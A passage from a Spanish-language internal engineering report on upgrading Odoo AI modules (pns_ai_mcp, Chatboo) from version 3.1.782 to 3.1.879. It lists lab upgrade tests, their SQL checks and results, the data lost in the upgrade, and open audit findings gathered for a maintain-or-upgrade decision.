- **Vuelta atrás:** el `-u` no se deshace volviendo al código 3.1.782: U5, U6, U9 y U16 cambian la BD.
  Hace falta la copia previa (procedimiento en `instalacion_liyben_pns_ai.md:259-267`).

### 9.5 Pruebas de la actualización (laboratorio, sobre una copia; cargarla lo decide Sergio)

| Id | Prueba | Resultado esperado |
|---|---|---|
| P-9a | Antes y después del `-u`: `SELECT table_name, column_name FROM information_schema.columns WHERE table_name IN ('ai_log','ai_mcp_user','chatboo_session','chatboo_async_request')`; `SELECT key FROM ir_config_parameter WHERE key LIKE 'pns_ai%'`; `SELECT module, name FROM ir_model_data WHERE model = 'ir.config_parameter' AND module LIKE 'pns_ai%'`; `SELECT name FROM ir_model_data WHERE module = 'pns_ai_mcp' AND name LIKE 'mcp\_%'`; `SELECT origin, count(*) FROM ai_log GROUP BY origin` y lo mismo en `ai_change_journal` | Columnas `key_pin*` fuera; las de `chatboo_async_request` intactas; cinco parámetros con el nombre `pns_ai.*` y sin XML ID; ningún `mcp_*`; mismos recuentos por `origin` |
| P-9b | Antes: `SELECT count(*) FROM ai_log WHERE agent_id IS NOT NULL`. `-u` de los tres y búsqueda en el log de «Deleting field» y `agent_id`. Después: la misma consulta | Según la auditoría, la columna sigue; según el core, desaparece (error «column does not exist») |
| P-9c | **Retirada** (verificación del 22/10): el caso «`-u` solo de `pns_ai_mcp`» no puede darse; el recuento por `origin` pasa a P-9a | — |
| P-9d | `SELECT code, active FROM ai_agent`; un turno de Chatboo que dispare la decisión de packs de contexto, con y sin un proveedor con la casilla Decision en la cadena de Chatboo; filas de `ai.log` del turno | Agente `pns_ai_decision` presente y sin uso; anotar qué proveedor decide en cada caso |
| P-9e | `SELECT count(*) FROM chatboo_session WHERE messages LIKE '%o_chatboo_%' OR messages LIKE '%data-chatboo-%'` antes y después; abrir una sesión antigua con 3.1.879 y, en otra copia, con el código 3.1.782 sobre la BD ya actualizada | Tras el `-u`, ningún atributo `data-chatboo-*` de `ENGINE_MARKUP` ni clase de `ENGINE_CLASSES` (pueden quedar clases propias de Chatboo más largas, `markup_rename.py:9-10`); la sesión se ve bien con 3.1.879; con 3.1.782, anotar qué se pierde (tablas, gráficos, botones) |
| P-9f | `SELECT name, latest_version FROM ir_module_module WHERE name LIKE 'pns_%'` y `odoo-dev 14 paridad pns_base,pns_ai_mcp,pns_ai_chatboo` | `pns_base` 14.0.1.2.47; sin módulos que no se importan |

### 9.6 Resultados de la fase 3 (22-23/10/2026)

Sobre `pns_demo_p9`, copia temporal del staging `pns_demo` (3.1.782 con los parches 1 a 12), con el `-u`
de los tres módulos a 3.1.879. Excepción puntual a N9; la BD y el volcado se borraron el 23/10/2026.
P-9d no entraba en el encargo. Detalle y consultas: `docs/pendiente/fase3_lab_pns_ai_3879.md`, parte 3
(y parte 2, paso 4, para la parte visual de P-9e).

| Id | Resultado | Frente a §9.5 |
|---|---|---|
| P-9a | Columnas `key_pin*` fuera; `chatboo_async_request` intacta (25 columnas); los cinco parámetros pasan a `pns_ai.*` sin XML ID y con el mismo valor; ningún `mcp_*`; mismos recuentos por `origin` en `ai_log` y en `ai_change_journal`. Ninguna tabla pierde filas; la única columna con datos que desaparece es `ai_log.agent_id` (P-9b) | Lo esperado |
| P-9b | **U9 confirmado:** el `-u` borra `ai_log.agent_id` («Deleting field ai.log.agent_id»; después, «column does not exist»). Se pierde el agente de 978 de 987 filas. **La auditoría del fabricante se equivoca**; nuestra comparación (U9) es correcta | Según el core |
| P-9e | 10 → 0 sesiones con marcas antiguas; las 17 marcas pasan a `o_ai_*` / `data-ai-*` con los mismos recuentos. En las sesiones 5, 16 y 27, deshecho el renombrado, el texto es idéntico byte a byte. **Comprobación visual correcta** con el cliente de 3.1.879 en las sesiones 5, 16 y 27 (tablas con formato, fichas, ordenación y gráfico donde hay columnas numéricas; sin errores en la consola). No se hizo la parte con el cliente de 3.1.782 sobre la BD actualizada | Lo esperado (sin la parte de 3.1.782) |
| P-9f | `latest_version` 14.0.1.2.47 / 14.0.3.1.879 / 14.0.2.1.538; `odoo-dev 14 paridad`: 23 iguales, 0 sin código, 0 que no se importan | Lo esperado |
| Cron de la papelera (U12) | El `-u` crea `pns_ai_mcp.ir_cron_ai_journal_trash` **activo**; en la copia lo desactivó la neutralización del kit | Coincide con U12 |

Las pérdidas son las de §9 (U5, U6, U9, U15, U16, U17 bis) y nada más: condición 4 de N12, **CUMPLE**.

#### Para producción (LIYBEN) y el staging

- **Antes del `-u`:** copia completa y, si interesa conservarla, una copia aparte de `ai_log.id` y
  `agent_id`: el `-u` borra la columna (U9).
- **Después del `-u`:** el cron nuevo `pns_ai_mcp.ir_cron_ai_journal_trash` queda **activo** (en el
  laboratorio lo desactivó la neutralización; en producción no hay neutralización).
- **Vuelta atrás:** el historial de Chatboo queda reescrito (U16) y solo se recupera con la copia.

## 10. Datos para la decisión sobre N12

> **Decidida después:** b′ (Sergio, 22/10/2026), mantenida el 23/10/2026 como excepción a la
> condición 3. Ver [n12_decision_3879.md](../pendiente/n12_decision_3879.md) y N12 en
> [pns_ai_decisiones.md](../pendiente/pns_ai_decisiones.md). El texto de este apartado se conserva
> como histórico.

N12 (`docs/pendiente/pns_ai_decisiones.md:1725-1759`) está decidida como **b) con vigilancia**
(mantener 3.1.782 como base propia) y se revisa a la vista de 3.1.879. Este apartado reúne los hechos
de §1 a §9 para cada opción. **No recomienda.** (a) = seguir con 3.1.782 y los parches de Seges;
(b) = pasar a 3.1.879 (reaplicando lo que haga falta). **Ojo:** en N12 de `pns_ai_decisiones.md` las letras van al
revés (a = reaplicar, b = mantener 3.1.782). La hoja de decisión
[n12_decision_3879.md](../pendiente/n12_decision_3879.md) usa las de N12.

### 10.1 Parches de Seges 1 a 12

| Parche | Con (a) | Con (b) | Dónde |
|---|---|---|---|
| 1 a 5 | Permanentes, en LIYBEN | Dejan de hacer falta: corrección equivalente | §1.2, §2.2 |
| 6 | Permanente, validado en staging | Deja de hacer falta por código; falta la prueba de 5 casos ampliada | §2.2, §5.6 (P-6) |
| 7, 8, 9 | Validados en staging; pendientes de LIYBEN | Dejan de hacer falta; el sandbox del fabricante es mejor (bloqueo general de `_`) | §2.2 |
| 10 | Validado en staging | Lo que cubre deja de hacer falta; adaptación: renombrar `collect_pin` a `_collect_pin` (único llamador, `models/mcp_user.py:766`) | §2.2, §3 (PNS-83) |
| 11 | Validado en staging | Habría que adaptarlo: el `unlink` sigue borrando en `sudo` adjuntos ajenos y el filtro compara con el dueño, no con el usuario real | §2.2, §3 (PNS-82) |
| 12 | Validado en staging, **pero no cierra M10** (hay que ampliarlo también aquí) | Criterio distinto: el fabricante cierra la cúspide para todos y deja libre el resto de grupos; el parche exige Ajustes para cualquier grupo. Habría que elegir criterio y, si es el de Seges, reaplicarlo cubriendo también la vía CRUD (`crud_cusp_error`) y cerrar M10 | §2.2, §7 (PNS-02), §8.7 (M10) |
| Tests de E1 y E2 | Siguen valiendo | Hay que adaptarlos antes de cargar (importación rota) y dos fallarán por la diferencia del parche 11 | §4.1 |

### 10.2 Restos que habría que corregir

**Iguales en las dos opciones** (el código está en 3.1.782, en la rama y en 3.1.879):
- M10 (**Crítica**, requiere AI Administrator; en la rama, escalada a `base.group_system`), M11 (Media; deja sin efecto el VERIFICADO de PNS-30 en cuanto a
  su check), M12, M5 y M16 (Baja) (§8.2, tabla por gravedad «Ya en 3.1.782»).
- PNS-97 (Media) y PNS-98 (Baja), NO CORREGIDO (§2.3, §3).
- El resto de PNS-26 sobre los `commit()` de la Caja B (§5.6, §7).

**Con (a): lo que 3.1.879 corrige y la rama no** (en 3.1.879 están VERIFICADO o mejor; en la rama
siguen abiertos o previstos):
- De §4: PNS-92, PNS-30 (con la salvedad de M11), PNS-37 (resto), obs. 8, PNS-89, PNS-28, PNS-33,
  PNS-20 (resto), obs. 2 y 3, PNS-60, 65, 35, 55, 66, 62, 16, 59, 86, 22 y 40 (§2.1, columna «Rama
  Seges»: «Previsto en E4», «Después» o «—»). Parciales en 3.1.879 pero mejores que la rama: PNS-07
  (métodos privados en el sandbox, incluido el alias D-2), PNS-19, 54, 17, 61, 36 y 84 (§2.1).
- De §5: el fondo de PNS-94 (E5), que 3.1.879 cubre en buena parte por código (§5.6); PNS-24, 32, 39,
  40, 29, 95/46, 49/74, 73 y 38 (§5.1 a §5.5); el alcance menor de D9 y PB-2 (§5.7).
- Lo funcional de §6 (topes, «Sin failover externo», revisión antes de importar, papelera, voces): no
  existe en 3.1.782.
- Plan de la rama aún pendiente: ET, E3, E4, E5 y «Después» (`plan_correccion_pns_ai.md:63-69`).

**Con (b): restos que quedan en 3.1.879** (PARCIAL, NO CORREGIDO o REQUIERE PRUEBA, por gravedad del
informe o propuesta). Los que vienen de fichas ya abiertas en 3.1.782 (PNS-54, 07, 19, 17, 61, 36, 84,
26, 81, 88, 50/77) siguen también abiertos con (a); los marcados «nuevo» y los de §6 solo existen en
3.1.879:
- Crítica: PNS-54 y PNS-07, PARCIAL (§3); M10 (también con (a), §8.7).
- Alta: PNS-83 (`collect_pin`), PNS-19, PNS-17 y PNS-82, PARCIAL (§3); PNS-26 resto, PARCIAL, con resto
  de gravedad Baja (§5.6); PNS-37 parte, PARCIAL, resto Alta (§6.1); M13, NO CORREGIDO y nuevo (§8.7);
  PNS-20 parte, REQUIERE PRUEBA (§6.1); PNS-94, REQUIERE PRUEBA (§5.6).
- Alta desde el 23/10/2026: PNS-70, CONFIRMADO en 3.1.879 en la fase 3 (§5.6). En 3.1.782 Chart.js
  4.4.8 también ocupa `window.Chart`, sin efecto observado en los gráficos de Odoo (staging); el
  origen está en las dos (también con (a)).
- Media: PNS-61, 36 y 84, PARCIAL (§3); PNS-29 parte y petición de §5, PARCIAL
  (§6.1); M1, M2 y F1, nuevos (§8.7).
- Baja: PNS-88 y PNS-50/77, PARCIAL (§5.6); D1, nuevo (§8.7); F4, hallado en la fase 3 (§8.7).
- Sin gravedad asignada: PNS-18, PARCIAL (§6.1, §7.1); PNS-81, degradación en Chatboo sin efecto de
  seguridad (§2.4, §5.6).
- Defensas alegadas de §7: PNS-18, 54 y 26 PARCIAL; PNS-02 NO CORREGIDO (§7).

### 10.3 Qué se pierde o cambia al actualizar y qué superficie entra

**Al actualizar (§9), solo con (b):**
- Datos que no vuelven sin copia: la columna `ai_log.agent_id` (U9, contra lo que dice la auditoría;
  confirmado en P-9b, §9.6), las columnas de PIN (U5), el historial de Chatboo reescrito (U16) y cinco
  parámetros renombrados (U6).
- Cambios de comportamiento: agente «Decision» huérfano y decisión con la cadena del agente (U11); cron
  nuevo de la papelera con el usuario por defecto (U12); voces remotas desactivadas (U20); tres skills
  nuevas para todo usuario de Chatboo (U15); el texto de fábrica editado se pisa (U15, D38).
- Cuatro cambios sin anunciar en las notas de versión (U6, U11, U15 skills, U16) y una nota falsa
  (U9) (§9.3).
- Numeración de `pns_base` incoherente con el registro: 1.2.47 (Odoo 19, 9.ª entrega) con contenido de
  la 1.2.38 (Odoo 14, 16.ª); riesgo de versiones futuras por debajo de la instalada (§9.1).

**Superficie nueva que entra con (b) (§8 y §6):** Canvas y páginas compartidas (F1, D1, M1, M2, M3, rutas
de §8.1), `collect_pin` (§3, PNS-83), papelera del diario con cron de superusuario (§6.1, PNS-37), vista
previa que ejecuta la importación (§6.1, PNS-20), `unlink_retired_from_module` (M13), proveedor de
diseño (F1), `fields_view_get` global de `pns_base` (§5.7, PB-2) y Chart.js 4 en `window.Chart` (§5.6,
PNS-70). Sin superficie nueva con (a).

**Límites de lo que se sabe de (b):** los `unit_tests/` que cita el fabricante no vienen en el paquete;
Chatboo no trae tests (§1.4, §5.5).

### 10.4 Pruebas pendientes antes de poder decidir

Todas en el laboratorio, sobre una copia fuera del repo (§4), con `odoo-dev 14 paridad` antes de cargar.

| Grupo | Pruebas | Qué aclaran |
|---|---|---|
| Solo afectan a (b): superficie nueva o restos de 3.1.879 | P-83a, P-83b, P-54a, P-54b, P-19, P-07, P-36, P-17, P-61, P-28, P-60, P-40, P-82, P-01 (§4.3); P-6 ampliada, P-26, P-70 (§5.6); P-29, P-18, P-20, P-37, P-37b (§6.1); P-8a, P-8c, P-8d, P-8e, P-8h (§8.7) | Si los PARCIAL y NO CORREGIDO de 3.1.879 se confirman |
| Afectan a las dos (código ya en 3.1.782 y en la rama) | P-8b, P-8f, P-8g (§8.7); P-97, P-98 (§4.3) | Alcance de M10, M11, M12, PNS-97 y PNS-98, que hay que corregir en cualquier caso |
| Actualización (solo b) | P-9a a P-9f (§9.5) | Qué pierde o cambia el `-u` en datos reales |
| Línea base | Tests del fabricante en `pns_ai_mcp/tests/` y los de Seges adaptados (§4.1) | Regresiones |
| Información que falta del fabricante | `unit_tests/` citados en la auditoría (§1.4); commit de `pns_base` del paquete (§9.1) | Lo que dicen que prueban y qué versión de `pns_base` es |
